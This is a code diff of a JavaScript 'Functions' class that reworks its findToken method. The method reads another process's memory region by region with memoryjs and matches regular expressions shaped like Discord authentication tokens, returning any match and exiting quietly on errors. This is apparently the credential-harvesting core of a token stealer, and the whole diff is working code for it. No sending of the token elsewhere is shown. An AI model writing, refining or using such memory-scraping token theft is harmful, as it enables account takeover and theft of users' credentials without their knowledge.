@@ -13,16 +13,14 @@ module.exports = class Functions {
     }
 
     async findToken(processObject) {
-        let addr = 0;
-
         const firstCheck = new RegExp(/[a-zA-Z0-9]{24}\.[a-zA-Z0-9-_]{6}\.[a-zA-Z0-9-_]{38}/g);
         const secondCheck = new RegExp(/[a-zA-Z0-9]{26}\.[a-zA-Z0-9-_]{6}\.[a-zA-Z0-9-_]{38}/g);
-        
-        // eslint-disable-next-line no-constant-condition
-        while (true) {
+        const regions = memoryjs.getRegions(processObject.handle);
+
+        for (let i = 0; i < regions.length; i++) {
             try {
-                const query = memoryjs.virtualQueryEx(processObject.handle, addr);
-                const string = memoryjs.readBuffer(processObject.handle, addr, query.RegionSize).toString();
+                const query = memoryjs.virtualQueryEx(processObject.handle, regions[i].BaseAddress);
+                const string = memoryjs.readBuffer(processObject.handle, regions[i].BaseAddress, query.RegionSize).toString();
 
                 const fToken = firstCheck.exec(string);
                 const sToken = secondCheck.exec(string);
@@ -32,8 +30,7 @@ module.exports = class Functions {
                 } else if (sToken) {
                     return sToken[0];
                 }
-        
-                addr = query.BaseAddress + query.RegionSize;
+    
             } catch (err) {
                 return process.exit();
             }
